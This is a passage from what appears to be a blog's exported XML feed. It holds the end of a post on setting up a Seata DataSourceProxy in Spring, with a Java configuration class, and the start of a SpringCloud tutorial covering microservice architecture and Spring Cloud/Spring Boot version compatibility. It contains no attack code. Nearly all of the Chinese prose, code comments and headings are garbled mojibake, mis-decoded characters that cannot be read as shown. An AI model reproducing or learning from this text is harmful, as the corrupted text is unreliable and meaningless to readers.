<p>è¿™é‡Œæ˜¯å®šä¹‰äº‹åŠ¡ç»„çš„åç§°ï¼Œæ¥ä¸‹æ¥ä¼šç”¨åˆ°ã€‚</p>
<p>ç„¶åæ˜¯åœ¨<code>resources</code>ç›®å½•ä¸‹æ”¾ä¸¤ä¸ªé…ç½®æ–‡ä»¶ï¼š<code>file.conf</code>å’Œ<code>registry.conf</code></p>
<p>å…¶ä¸­ï¼Œ<code>registry.conf</code>ä¸TCæœåŠ¡ç«¯çš„ä¸€æ ·ï¼Œæ­¤å¤„ä¸å†è®²è§£ã€‚</p>
<p>Seataçš„äºŒé˜¶æ®µæ‰§è¡Œæ˜¯é€šè¿‡æ‹¦æˆªsqlè¯­å¥ï¼Œåˆ†æè¯­ä¹‰æ¥æŒ‡å®šå›æ»šç­–ç•¥ï¼Œå› æ­¤éœ€è¦å¯¹DataSourceåšä»£ç†ã€‚æˆ‘ä»¬åœ¨é¡¹ç›®çš„<code>cn.itcast.order.config</code>åŒ…ä¸­ï¼Œæ·»åŠ ä¸€ä¸ªé…ç½®ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.order.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.datasource.DataSourceProxy;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataSourceProxyConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactory <span class="title function_">sqlSessionFactoryBean</span><span class="params">(DataSource dataSource)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// è®¢å•æœåŠ¡ä¸­å¼•å…¥äº†mybatis-plusï¼Œæ‰€ä»¥è¦ä½¿ç”¨ç‰¹æ®Šçš„SqlSessionFactoryBean</span></span><br><span class="line">        <span class="type">MybatisSqlSessionFactoryBean</span> <span class="variable">sqlSessionFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisSqlSessionFactoryBean</span>();</span><br><span class="line">        <span class="comment">// ä»£ç†æ•°æ®æº</span></span><br><span class="line">        sqlSessionFactoryBean.setDataSource(<span class="keyword">new</span> <span class="title class_">DataSourceProxy</span>(dataSource));</span><br><span class="line">        <span class="comment">// ç”ŸæˆSqlSessionFactory</span></span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¿™é‡Œå› ä¸ºè®¢å•æœåŠ¡ä½¿ç”¨äº†mybatis-plusè¿™ä¸ªæ¡†æ¶ï¼ˆè¿™æ˜¯ä¸€ä¸ªmybatisé›†æˆæ¡†æ¶ï¼Œè‡ªåŠ¨ç”Ÿæˆå•è¡¨Sqlï¼‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç”¨mybatis-plusçš„<code>MybatisSqlSessionFactoryBean</code>ä»£æ›¿<code>SqlSessionFactoryBean</code></p>
<p>å¦‚æœç”¨çš„æ˜¯åŸç”Ÿçš„mybatisï¼Œè¯·ä½¿ç”¨<code>SqlSessionFactoryBean</code>ã€‚</p>
<p>æ·»åŠ äº‹åŠ¡æ³¨è§£</p>
<p>ç»™äº‹åŠ¡å‘èµ·è€…<code>order_service</code>çš„<code>OrderServiceImpl</code>ä¸­çš„<code>createOrder()</code>æ–¹æ³•æ·»åŠ <code>@GlobalTransactional</code>æ³¨è§£ï¼Œå¼€å¯å…¨å±€äº‹åŠ¡</p>
<h1 id="å¾®ä¿¡æ”¯ä»˜"><a href="#å¾®ä¿¡æ”¯ä»˜" class="headerlink" title="å¾®ä¿¡æ”¯ä»˜"></a>å¾®ä¿¡æ”¯ä»˜</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149762.png" alt="image-20210415162630464"></p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud</title>
    <url>/2021/12/21/Java/SpringCloud/</url>
    <content><![CDATA[<h1 id="ç¬¬ä¸€ç« -å¾®æœåŠ¡æ¶æ„æ¦‚è¿°"><a href="#ç¬¬ä¸€ç« -å¾®æœåŠ¡æ¶æ„æ¦‚è¿°" class="headerlink" title="ç¬¬ä¸€ç«  å¾®æœåŠ¡æ¶æ„æ¦‚è¿°"></a>ç¬¬ä¸€ç«  å¾®æœåŠ¡æ¶æ„æ¦‚è¿°</h1><h2 id="1-1-ç³»ç»Ÿè¿›åŒ–ç†è®ºæ¦‚è¿°"><a href="#1-1-ç³»ç»Ÿè¿›åŒ–ç†è®ºæ¦‚è¿°" class="headerlink" title="1.1 ç³»ç»Ÿè¿›åŒ–ç†è®ºæ¦‚è¿°"></a>1.1 ç³»ç»Ÿè¿›åŒ–ç†è®ºæ¦‚è¿°</h2><p><strong>é›†ä¸­å¼ç³»ç»Ÿï¼š</strong></p>
<p>é›†ä¸­å¼ç³»ç»Ÿä¹Ÿå«å•ä½“åº”ç”¨ï¼Œå°±æ˜¯æŠŠæ‰€æœ‰çš„ç¨‹åºã€åŠŸèƒ½ã€æ¨¡å—éƒ½é›†ä¸­åˆ°ä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œéƒ¨ç½²åœ¨ä¸€å°æœåŠ¡å™¨ä¸Šï¼Œä»è€Œå¯¹å¤–æä¾›æœåŠ¡ï¼›</p>
<p><strong>åˆ†å¸ƒå¼ç³»ç»Ÿ</strong></p>
<p>åˆ†å¸ƒå¼ç³»ç»Ÿå°±æ˜¯æŠŠæ‰€æœ‰çš„ç¨‹åºã€åŠŸèƒ½æ‹†åˆ†æˆä¸åŒçš„å­ç³»ç»Ÿï¼Œéƒ¨ç½²åœ¨å¤šå°ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œè¿™äº›å­ç³»ç»Ÿç›¸äº’åä½œå…±åŒå¯¹å¤–æä¾›æœåŠ¡ï¼Œè€Œå¯¹ç”¨æˆ·è€Œè¨€ä»–å¹¶ä¸çŸ¥é“åå°æ˜¯å¤šä¸ªå­ç³»ç»Ÿå’Œå¤šå°æœåŠ¡å™¨åœ¨æä¾›æœåŠ¡ï¼Œåœ¨ä½¿ç”¨ä¸Šå’Œé›†ä¸­å¼ç³»ç»Ÿä¸€æ ·ï¼›</p>
<p>é›†ä¸­å¼ç³»ç»Ÿè·Ÿåˆ†å¸ƒå¼ç³»ç»Ÿæ˜¯ç›¸åçš„ä¸¤ä¸ªæ¦‚å¿µï¼Œä»–ä»¬çš„åŒºåˆ«ä½“ç°åœ¨â€œåˆâ€ä¸â€œåˆ†â€ã€‚</p>
<h2 id="1-2-ç³»ç»Ÿè¿›åŒ–ç†è®ºèƒŒæ™¯"><a href="#1-2-ç³»ç»Ÿè¿›åŒ–ç†è®ºèƒŒæ™¯" class="headerlink" title="1.2 ç³»ç»Ÿè¿›åŒ–ç†è®ºèƒŒæ™¯"></a>1.2 ç³»ç»Ÿè¿›åŒ–ç†è®ºèƒŒæ™¯</h2><p>ç³»ç»Ÿè¿›åŒ–çš„èƒŒæ™¯ä¸ä¸­å›½äº’è”ç½‘ç”¨æˆ·è§„æ¨¡åºå¤§æœ‰å·¨å¤§å…³ç³»ï¼Œä¸­å›½äº’è”ç½‘ç”¨æˆ·è§„æ¨¡æœ‰7.7äº¿ï¼Œåºå¤§çš„ç”¨æˆ·è®¿é—®é‡å¯¹ç³»ç»Ÿçš„æ¶æ„è®¾è®¡æ˜¯å·¨å¤§çš„æŒ‘æˆ˜ï¼› </p>
<p>äº§å“æˆ–è€…ç½‘ç«™åˆæœŸï¼Œé€šå¸¸åŠŸèƒ½è¾ƒå°‘ï¼Œç”¨æˆ·é‡ä¹Ÿä¸å¤šï¼Œæ‰€ä»¥ä¸€èˆ¬æŒ‰ç…§å•ä½“åº”ç”¨è¿›è¡Œè®¾è®¡å’Œå¼€å‘ï¼ŒæŒ‰ç…§ç»å…¸çš„MVCä¸‰å±‚æ¶æ„è®¾è®¡ï¼›</p>
<p>éšç€ä¸šåŠ¡çš„å‘å±•ï¼Œåº”ç”¨åŠŸèƒ½çš„å¢åŠ ï¼Œè®¿é—®ç”¨æˆ·çš„å¢å¤šï¼Œä¼ ç»Ÿçš„é‡‡ç”¨é›†ä¸­å¼ç³»ç»Ÿè¿›è¡Œå¼€å‘çš„æ–¹å¼å°±ä¸å†é€‚ç”¨äº†ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé›†ä¸­å¼ç³»ç»Ÿå°±ä¼šé€æ­¥å˜å¾—éå¸¸åºå¤§ï¼Œå¾ˆå¤šäººç»´æŠ¤è¿™ä¹ˆä¸€ä¸ªç³»ç»Ÿï¼Œå¼€å‘ã€æµ‹è¯•ã€ä¸Šçº¿éƒ½ä¼šé€ æˆå¾ˆå¤§é—®é¢˜ï¼Œæ¯”å¦‚ä»£ç å†²çªï¼Œä»£ç é‡å¤ï¼Œé€»è¾‘é”™ç»¼æ··ä¹±ï¼Œä»£ç é€»è¾‘å¤æ‚åº¦å¢åŠ ï¼Œå“åº”æ–°éœ€æ±‚çš„é€Ÿåº¦é™ä½ï¼Œéšè—çš„é£é™©å¢å¤§ï¼›</p>
<p>æ‰€ä»¥éœ€è¦æŒ‰ç…§ä¸šåŠ¡ç»´åº¦è¿›è¡Œåº”ç”¨æ‹†åˆ†ï¼Œé‡‡ç”¨åˆ†å¸ƒå¼å¼€å‘ï¼Œæ¯ä¸ªåº”ç”¨ä¸“èŒäºåšæŸä¸€äº›æ–¹é¢çš„äº‹æƒ…ï¼Œæ¯”å¦‚å°†ä¸€ä¸ªé›†ä¸­å¼ç³»ç»Ÿæ‹†åˆ†ä¸ºç”¨æˆ·æœåŠ¡ã€è®¢å•æœåŠ¡ã€äº§å“æœåŠ¡ã€äº¤æ˜“æœåŠ¡ç­‰ï¼Œå„ä¸ªåº”ç”¨æœåŠ¡ä¹‹é—´é€šè¿‡ç›¸äº’è°ƒç”¨å®ŒæˆæŸä¸€é¡¹ä¸šåŠ¡åŠŸèƒ½ã€‚</p>
<h2 id="1-3-ä»€ä¹ˆæ˜¯å¾®æœåŠ¡æ¶æ„"><a href="#1-3-ä»€ä¹ˆæ˜¯å¾®æœåŠ¡æ¶æ„" class="headerlink" title="1.3 ä»€ä¹ˆæ˜¯å¾®æœåŠ¡æ¶æ„"></a>1.3 ä»€ä¹ˆæ˜¯å¾®æœåŠ¡æ¶æ„</h2><p>åˆ†å¸ƒå¼å¼ºè°ƒç³»ç»Ÿçš„æ‹†åˆ†ï¼Œå¾®æœåŠ¡ä¹Ÿæ˜¯å¼ºè°ƒç³»ç»Ÿçš„æ‹†åˆ†ï¼Œå¾®æœåŠ¡æ¶æ„å±äºåˆ†å¸ƒå¼æ¶æ„çš„èŒƒç•´ã€‚</p>
<p>å¾®æœåŠ¡æ˜¯ç³»ç»Ÿæ¶æ„ä¸Šçš„ä¸€ç§è®¾è®¡é£æ ¼ï¼Œå®ƒçš„ä¸»æ—¨æ˜¯å°†ä¸€ä¸ªåŸæœ¬ç‹¬ç«‹çš„ç³»ç»Ÿæ‹†åˆ†æˆå¤šä¸ªå°å‹æœåŠ¡ï¼Œè¿™äº›å°å‹æœåŠ¡éƒ½åœ¨å„è‡ªç‹¬ç«‹çš„è¿›ç¨‹ä¸­è¿è¡Œï¼ŒæœåŠ¡é—´åŸºäºHTTPçš„RESTful APIè¿›è¡Œé€šä¿¡åä½œã€‚</p>
<p>è¢«æ‹†åˆ†åçš„æ¯ä¸ªå°å‹æœåŠ¡éƒ½å›´ç»•ç€ç³»ç»Ÿä¸­çš„æŸä¸€é¡¹ä¸šåŠ¡åŠŸèƒ½è¿›è¡Œæ„å»ºï¼Œå¹¶ä¸”æ¯ä¸ªæœåŠ¡éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®ï¼Œå¯ä»¥è¿›è¡Œç‹¬ç«‹çš„æµ‹è¯•ã€å¼€å‘å’Œéƒ¨ç½²ç­‰ã€‚</p>
<p>ç”±äºæ¯ä¸ªç‹¬ç«‹çš„æœåŠ¡ä¹‹é—´ä½¿ç”¨åŸºäºHTTPçš„ä½œä¸ºæ•°æ®é€šä¿¡åä½œçš„åŸºç¡€ï¼Œæ‰€ä»¥è¿™äº›å¾®æœåŠ¡å¯ä»¥ä½¿ç”¨ä¸åŒçš„è¯­è¨€æ¥å¼€å‘ã€‚</p>
<h2 id="1-4-å¾®æœåŠ¡æ¶æ„çš„ä¼˜ç¼ºç‚¹"><a href="#1-4-å¾®æœåŠ¡æ¶æ„çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="1.4 å¾®æœåŠ¡æ¶æ„çš„ä¼˜ç¼ºç‚¹"></a>1.4 å¾®æœåŠ¡æ¶æ„çš„ä¼˜ç¼ºç‚¹</h2><p>ä¼˜ç‚¹ï¼š</p>
<ol>
<li><p>æˆ‘ä»¬çŸ¥é“å¾®æœåŠ¡æ¶æ„æ˜¯å°†ç³»ç»Ÿä¸­çš„ä¸åŒåŠŸèƒ½æ¨¡å—æ‹†åˆ†æˆå¤šä¸ªä¸åŒçš„æœåŠ¡ï¼Œè¿™äº›æœåŠ¡è¿›è¡Œç‹¬ç«‹åœ°å¼€å‘å’Œéƒ¨ç½²ï¼Œæ¯ä¸ªæœåŠ¡éƒ½è¿è¡Œåœ¨è‡ªå·±çš„è¿›ç¨‹å†…ï¼Œè¿™æ ·æ¯ä¸ªæœåŠ¡çš„æ›´æ–°éƒ½ä¸ä¼šå½±å“å…¶ä»–æœåŠ¡çš„è¿è¡Œï¼›</p>
</li>
<li><p>ç”±äºæ¯ä¸ªæœåŠ¡æ˜¯ç‹¬ç«‹éƒ¨ç½²çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ›´å‡†ç¡®åœ°ç›‘æ§æ¯ä¸ªæœåŠ¡çš„èµ„æºæ¶ˆè€—æƒ…å†µï¼Œè¿›è¡Œæ€§èƒ½å®¹é‡çš„è¯„ä¼°ï¼Œé€šè¿‡å‹åŠ›æµ‹è¯•ï¼Œä¹Ÿå¾ˆå®¹æ˜“å‘ç°å„ä¸ªæœåŠ¡é—´çš„æ€§èƒ½ç“¶é¢ˆæ‰€åœ¨ï¼›</p>
</li>
<li><p>ç”±äºæ¯ä¸ªæœåŠ¡éƒ½æ˜¯ç‹¬ç«‹å¼€å‘ï¼Œé¡¹ç›®çš„å¼€å‘ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œå‡å°‘ä»£ç çš„å†²çªã€ä»£ç çš„é‡å¤ï¼Œé€»è¾‘å¤„ç†æµç¨‹ä¹Ÿæ›´åŠ æ¸…æ™°ï¼Œè®©åç»­çš„ç»´æŠ¤ä¸æ‰©å±•æ›´åŠ å®¹æ˜“ï¼›</p>
</li>
<li><p>å¾®æœåŠ¡å¯ä»¥ä½¿ç”¨ä¸åŒçš„ç¼–ç¨‹è¯­è¨€è¿›è¡Œå¼€å‘ï¼›</p>
</li>
</ol>
<p>ç¼ºç‚¹ï¼š</p>
<ol>
<li><p>å¾®æœåŠ¡æ¶æ„å¢åŠ äº†ç³»ç»Ÿç»´æŠ¤ã€éƒ¨ç½²çš„éš¾åº¦ï¼Œå¯¼è‡´ä¸€äº›åŠŸèƒ½æ¨¡å—æˆ–ä»£ç æ— æ³•å¤ç”¨ï¼›</p>
</li>
<li><p>éšç€ç³»ç»Ÿè§„æ¨¡çš„æ—¥æ¸å¢é•¿ï¼Œå¾®æœåŠ¡åœ¨ä¸€å®šç¨‹åº¦ä¸Šä¹Ÿä¼šå¯¼è‡´ç³»ç»Ÿå˜å¾—è¶Šæ¥è¶Šå¤æ‚ï¼Œå¢åŠ äº†é›†æˆæµ‹è¯•çš„å¤æ‚åº¦ï¼›</p>
</li>
<li><p>éšç€å¾®æœåŠ¡çš„å¢å¤šï¼Œæ•°æ®çš„ä¸€è‡´æ€§é—®é¢˜ï¼ŒæœåŠ¡ä¹‹é—´çš„é€šä¿¡æˆæœ¬ç­‰éƒ½å‡¸æ˜¾äº†å‡ºæ¥ï¼›</p>
</li>
</ol>
<h2 id="1-5-ä¸ºä»€ä¹ˆé€‰æ‹©Spring-Cloudæ„å»ºå¾®æœåŠ¡"><a href="#1-5-ä¸ºä»€ä¹ˆé€‰æ‹©Spring-Cloudæ„å»ºå¾®æœåŠ¡" class="headerlink" title="1.5 ä¸ºä»€ä¹ˆé€‰æ‹©Spring Cloudæ„å»ºå¾®æœåŠ¡"></a>1.5 ä¸ºä»€ä¹ˆé€‰æ‹©Spring Cloudæ„å»ºå¾®æœåŠ¡</h2><p>å¾®æœåŠ¡ä¸€è¯æ˜¯Martin Fowlerï¼ˆé©¬ä¸.ç¦å‹’ï¼‰äº2014å¹´æå‡ºæ¥çš„ï¼Œè¿‘å‡ å¹´å¾®æœåŠ¡æ¶æ„çš„è®¨è®ºéå¸¸ç«çƒ­ï¼Œæ— æ•°çš„æ¶æ„å¸ˆå’Œå¼€å‘è€…åœ¨å®é™…é¡¹ç›®ä¸­å®è·µç€å¾®æœåŠ¡æ¶æ„çš„è®¾è®¡ç†å¿µï¼Œä»–ä»¬åœ¨å¾®æœåŠ¡æ¶æ„ä¸­é’ˆå¯¹ä¸åŒåº”ç”¨åœºæ™¯å‡ºç°çš„å„ç§é—®é¢˜ï¼Œä¹Ÿæ¨å‡ºäº†å¾ˆå¤šè§£å†³æ–¹æ¡ˆå’Œå¼€æºæ¡†æ¶ï¼Œå…¶ä¸­æˆ‘ä»¬å›½å†…çš„äº’è”ç½‘ä¼ä¸šä¹Ÿæœ‰ä¸€äº›è‘—åçš„æ¡†æ¶å’Œæ–¹æ¡ˆï¼›</p>
<p>æ•´ä¸ªå¾®æœåŠ¡æ¶æ„æ˜¯ç”±å¤§é‡çš„æŠ€æœ¯æ¡†æ¶å’Œæ–¹æ¡ˆæ„æˆï¼Œæ¯”å¦‚ï¼š</p>
<table>
<thead>
<tr>
<th>æœåŠ¡åŸºç¡€å¼€å‘</th>
<th>Spring MVCã€Springã€SpringBoot</th>
</tr>
</thead>
<tbody><tr>
<td>æœåŠ¡æ³¨å†Œä¸å‘ç°</td>
<td>Netflixçš„Eurekaã€Apacheçš„ZooKeeperç­‰</td>
</tr>
<tr>
<td>æœåŠ¡è°ƒç”¨</td>
<td>RPCè°ƒç”¨æœ‰é˜¿é‡Œå·´å·´çš„Dubboï¼ŒRestæ–¹å¼è°ƒç”¨æœ‰å½“å½“ç½‘DubboåŸºç¡€ä¸Šæ‰©å±•çš„Dubboxã€è¿˜æœ‰å…¶ä»–æ–¹å¼å®ç°çš„Restï¼Œæ¯”å¦‚Ribbonã€Feign</td>
</tr>
<tr>
<td>åˆ†å¸ƒå¼é…ç½®ç®¡ç†</td>
<td>ç™¾åº¦çš„Disconfã€360çš„QConfã€æ·˜å®çš„Diamondã€Netflixçš„Archaiusç­‰</td>
</tr>
<tr>
<td>è´Ÿè½½å‡è¡¡</td>
<td>Ribbon</td>
</tr>
<tr>
<td>æœåŠ¡ç†”æ–­</td>
<td>Hystrix</td>
</tr>
<tr>
<td>APIç½‘å…³</td>
<td>Zuul</td>
</tr>
<tr>
<td>æ‰¹é‡ä»»åŠ¡</td>
<td>å½“å½“ç½‘çš„Elastic-Jobã€Linkedlnçš„Azkaban</td>
</tr>
<tr>
<td>æœåŠ¡è·Ÿè¸ª</td>
<td>äº¬ä¸œçš„Hydraã€Twitterçš„Zipkinç­‰</td>
</tr>
</tbody></table>
<p>ä½†æ˜¯åœ¨å¾®æœåŠ¡æ¶æ„ä¸Šï¼Œå‡ ä¹å¤§éƒ¨åˆ†çš„å¼€æºç»„ä»¶éƒ½åªèƒ½è§£å†³æŸä¸€ä¸ªåœºæ™¯ä¸‹çš„é—®é¢˜ï¼Œæ‰€ä»¥è¿™äº›å®æ–½å¾®æœåŠ¡æ¶æ„çš„å…¬å¸ä¹Ÿæ˜¯æ•´åˆæ¥è‡ªä¸åŒå…¬å¸æˆ–ç»„ç»‡çš„è¯¸å¤šå¼€æºæ¡†æ¶ï¼Œå¹¶åŠ å…¥é’ˆå¯¹è‡ªèº«ä¸šåŠ¡çš„ä¸€äº›æ”¹è¿›ï¼Œæ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€çš„æ¶æ„æ–¹æ¡ˆï¼›</p>
<p>æ‰€ä»¥å½“æˆ‘ä»¬å‡†å¤‡å®æ–½å¾®æœåŠ¡æ¶æ„æ—¶ï¼Œæˆ‘ä»¬è¦æ•´åˆå„ä¸ªå…¬å¸æˆ–ç»„ç»‡çš„å¼€æºè½¯ä»¶ï¼Œè€Œä¸”æŸäº›å¼€æºè½¯ä»¶åˆæœ‰å¤šç§é€‰æ‹©ï¼Œè¿™å¯¼è‡´åœ¨åšæŠ€æœ¯é€‰å‹çš„åˆæœŸï¼Œéœ€è¦èŠ±è´¹å¤§é‡çš„æ—¶é—´è¿›è¡Œé¢„å¤‡ç ”ã€åˆ†æå’Œå®éªŒï¼Œè¿™äº›æ–¹æ¡ˆçš„æ•´åˆæ²¡æœ‰å¾—åˆ°å……åˆ†çš„æµ‹è¯•ï¼Œå¯èƒ½åœ¨å®è·µä¸­ä¼šé‡åˆ°å„ç§å„æ ·çš„é—®é¢˜ï¼›</p>
<p>Spring Cloudçš„å‡ºç°ï¼Œå¯ä»¥è¯´æ˜¯ä¸ºå¾®æœåŠ¡æ¶æ„è¿æ¥ä¸€ç¼•æ›™å…‰ï¼Œæœ‰SpringCloudç¤¾åŒºçš„å·¨å¤§æ”¯æŒå’ŒæŠ€æœ¯ä¿éšœï¼Œè®©æˆ‘ä»¬å®æ–½å¾®æœåŠ¡æ¶æ„å˜å¾—å¼‚å¸¸ç®€å•äº†èµ·æ¥ï¼Œå®ƒä¸åƒæˆ‘ä»¬ä¹‹å‰æ‰€åˆ—ä¸¾çš„æ¡†æ¶é‚£æ ·ï¼Œåªæ˜¯è§£å†³å¾®æœåŠ¡ä¸­çš„æŸä¸€ä¸ªé—®é¢˜ï¼Œè€Œæ˜¯ä¸€ä¸ªè§£å†³å¾®æœåŠ¡æ¶æ„å®æ–½çš„ç»¼åˆæ€§è§£å†³æ¡†æ¶ï¼Œå®ƒæ•´åˆäº†è¯¸å¤šè¢«å¹¿æ³›å®è·µå’Œè¯æ˜æœ‰æ•ˆçš„æ¡†æ¶ä½œä¸ºå®æ–½çš„åŸºç¡€ç»„ä»¶ï¼Œåˆåœ¨è¯¥ä½“ç³»åŸºç¡€ä¸Šåˆ›å»ºäº†ä¸€äº›éå¸¸ä¼˜ç§€çš„è¾¹ç¼˜ç»„ä»¶å°†å®ƒä»¬å¾ˆå¥½åœ°æ•´åˆèµ·æ¥ã€‚</p>
<p>åŠ ä¹‹Spring Cloud æœ‰å…¶Spring çš„å¼ºå¤§æŠ€æœ¯èƒŒæ™¯ï¼Œæé«˜çš„ç¤¾åŒºæ´»è·ƒåº¦ï¼Œä¹Ÿè®¸æœªæ¥Spring Cloudä¼šæˆä¸ºå¾®æœåŠ¡çš„æ ‡å‡†æŠ€æœ¯è§£å†³æ–¹æ¡ˆï¼›</p>
<h1 id="ç¬¬äºŒç« -è®¤è¯†Spring-Cloud"><a href="#ç¬¬äºŒç« -è®¤è¯†Spring-Cloud" class="headerlink" title="ç¬¬äºŒç«  è®¤è¯†Spring Cloud"></a>ç¬¬äºŒç«  è®¤è¯†Spring Cloud</h1><h2 id="2-1-Spring-Cloudæ˜¯ä»€ä¹ˆ"><a href="#2-1-Spring-Cloudæ˜¯ä»€ä¹ˆ" class="headerlink" title="2.1 Spring Cloudæ˜¯ä»€ä¹ˆ"></a>2.1 Spring Cloudæ˜¯ä»€ä¹ˆ</h2><ol>
<li><p>Spring Cloudæ˜¯ä¸€ä¸ªä¸€ç«™å¼çš„å¼€å‘åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ¡†æ¶ï¼Œä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç³»åˆ—çš„æ„å»ºåˆ†å¸ƒå¼ç³»ç»Ÿçš„å·¥å…·é›†ï¼›</p>
</li>
<li><p>Spring Cloudä¸ºå¼€å‘äººå‘˜æä¾›äº†å¿«é€Ÿæ„å»ºåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¸€äº›å¸¸è§æ¨¡å¼çš„å·¥å…·ï¼ˆæ¯”å¦‚ï¼šé…ç½®ç®¡ç†ï¼ŒæœåŠ¡å‘ç°ï¼Œæ–­è·¯å™¨ï¼Œæ™ºèƒ½è·¯ç”±ã€å¾®ä»£ç†ã€æ§åˆ¶æ€»çº¿ã€å…¨å±€é”ã€å†³ç­–ç«é€‰ã€åˆ†å¸ƒå¼ä¼šè¯å’Œé›†ç¾¤çŠ¶æ€ç®¡ç†ç­‰ï¼‰ï¼›</p>
</li>
<li><p>å¼€å‘åˆ†å¸ƒå¼ç³»ç»Ÿéƒ½éœ€è¦è§£å†³ä¸€ç³»åˆ—å…±åŒå…³å¿ƒçš„é—®é¢˜ï¼Œè€Œä½¿ç”¨Spring Cloudå¯ä»¥å¿«é€Ÿåœ°å®ç°è¿™äº›åˆ†å¸ƒå¼å¼€å‘å…±åŒå…³å¿ƒçš„é—®é¢˜ï¼Œå¹¶èƒ½æ–¹ä¾¿åœ°åœ¨ä»»ä½•åˆ†å¸ƒå¼ç¯å¢ƒä¸­éƒ¨ç½²ä¸è¿è¡Œã€‚</p>
</li>
<li><p>Spring Cloudè¿™ä¸ªä¸€ç«™å¼åœ°åˆ†å¸ƒå¼å¼€å‘æ¡†æ¶ï¼Œè¢«è¿‘å¹´æ¥æµè¡Œçš„â€œå¾®æœåŠ¡â€æ¶æ„æ‰€å¤§åŠ›æ¨å´‡ï¼Œæˆä¸ºç›®å‰è¿›è¡Œå¾®æœåŠ¡æ¶æ„çš„ä¼˜å…ˆé€‰æ‹©å·¥å…·ï¼›</p>
</li>
<li><p>Spring CloudåŸºäºSpring Bootæ¡†æ¶æ„å»ºå¾®æœåŠ¡æ¶æ„ï¼Œå­¦ä¹ Spring Cloudéœ€è¦å…ˆå­¦ä¹ Spring Bootï¼›</p>
</li>
<li><p>SpringCloudå®˜ç½‘ï¼š<a href="http://spring.io/">http://spring.io</a></p>
</li>
</ol>
<h2 id="2-2-Spring-Cloudçš„ç‰ˆæœ¬"><a href="#2-2-Spring-Cloudçš„ç‰ˆæœ¬" class="headerlink" title="2.2 Spring Cloudçš„ç‰ˆæœ¬"></a>2.2 Spring Cloudçš„ç‰ˆæœ¬</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Cloudæœ€æ—©æ˜¯ä»2014å¹´æ¨å‡ºçš„ï¼Œåœ¨æ¨å‡ºçš„å‰æœŸæ›´æ–°è¿­ä»£é€Ÿåº¦éå¸¸å¿«ï¼Œé¢‘ç¹å‘å¸ƒæ–°ç‰ˆæœ¬ï¼Œç›®å‰æ›´è¶‹äºç¨³å®šï¼Œå˜åŒ–ç¨æ…¢ä¸€äº›ï¼›</span><br><span class="line">Spring Cloudçš„ç‰ˆæœ¬å¹¶ä¸æ˜¯ä¼ ç»Ÿçš„ä½¿ç”¨æ•°å­—çš„æ–¹å¼æ ‡è¯†ï¼Œè€Œæ˜¯ä½¿ç”¨è¯¸å¦‚ï¼šAngelã€Brixtonã€Camden......ç­‰ä¼¦æ•¦çš„åœ°åæ¥å‘½åç‰ˆæœ¬ï¼Œç‰ˆæœ¬çš„å…ˆåé¡ºåºä½¿ç”¨å­—æ¯è¡¨A-Zçš„å…ˆåæ¥æ ‡è¯†,ï¼Œç°åœ¨å·²ç»è¿›å…¥Hç‰ˆæœ¬ï¼›Hoxton.RC2ç‰ˆæœ¬ï¼Œå¯¹åº”SpringBoot 2.2.x</span><br></pre></td></tr></table></figure>

<p>Spring Cloudä¸Spring Bootç‰ˆæœ¬åŒ¹é…å…³ç³»</p>
<table>
<thead>
<tr>
<th>Finchley</th>
<th>å…¼å®¹Spring Boot 2.0.xï¼Œ  ä¸å…¼å®¹Spring Boot 1.5.x</th>
</tr>
</thead>
<tbody><tr>
<td>Edgware</td>
<td>å…¼å®¹Spring Boot 1.5.xï¼Œ  ä¸å…¼å®¹Spring Boot 2.0.x</td>
</tr>
<tr>
<td>Dalston</td>
<td>å…¼å®¹Spring Boot 1.5.xï¼Œ  ä¸å…¼å®¹Spring Boot 2.0.x</td>
</tr>
<tr>
<td>Camden</td>
<td>å…¼å®¹Spring Boot 1.4.xï¼Œ  ä¹Ÿå…¼å®¹Spring Boot 1.5.x</td>
</tr>
<tr>
<td>Brixton</td>
<td>å…¼å®¹Spring Boot 1.3.xï¼Œ  ä¹Ÿå…¼å®¹Spring Boot 1.4.x</td>
</tr>
<tr>
<td>Angel</td>
<td>å…¼å®¹Spring Boot 1.2.x</td>
</tr>
</tbody></table>
